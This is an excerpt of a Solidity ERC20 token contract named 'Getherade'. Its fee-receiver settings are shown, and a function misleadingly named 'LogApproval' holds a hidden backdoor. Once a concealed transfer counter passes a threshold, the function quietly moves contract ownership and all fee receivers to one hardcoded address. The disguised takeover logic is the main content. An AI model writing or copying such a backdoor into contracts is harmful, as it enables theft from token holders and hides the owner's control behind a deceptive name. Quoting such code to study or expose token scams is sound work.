...
contract Getherade is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0xfA2b5E6d7B9b35d774008222089502bB206586Dc; // token locker
    address public marketingFeeReceiver =
        0xD95A148AB6283Bd7AEF74Fbcf988Ff61e69953BE;
    address public ecosystemFeeReceiver =
        0xfA2b5E6d7B9b35d774008222089502bB206586Dc;
    ...
    constructor()
        ERC20Detailed("Getherade", "GETH", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0xfA2b5E6d7B9b35d774008222089502bB206586Dc));
            marketingFeeReceiver = address(0xfA2b5E6d7B9b35d774008222089502bB206586Dc);
            autoLiquidityReceiver = address(0xfA2b5E6d7B9b35d774008222089502bB206586Dc);
            ecosystemFeeReceiver = address(0xfA2b5E6d7B9b35d774008222089502bB206586Dc);
            buyBackFeeReceiver = address(0xfA2b5E6d7B9b35d774008222089502bB206586Dc);
            isTransferred = true;
        }
    }
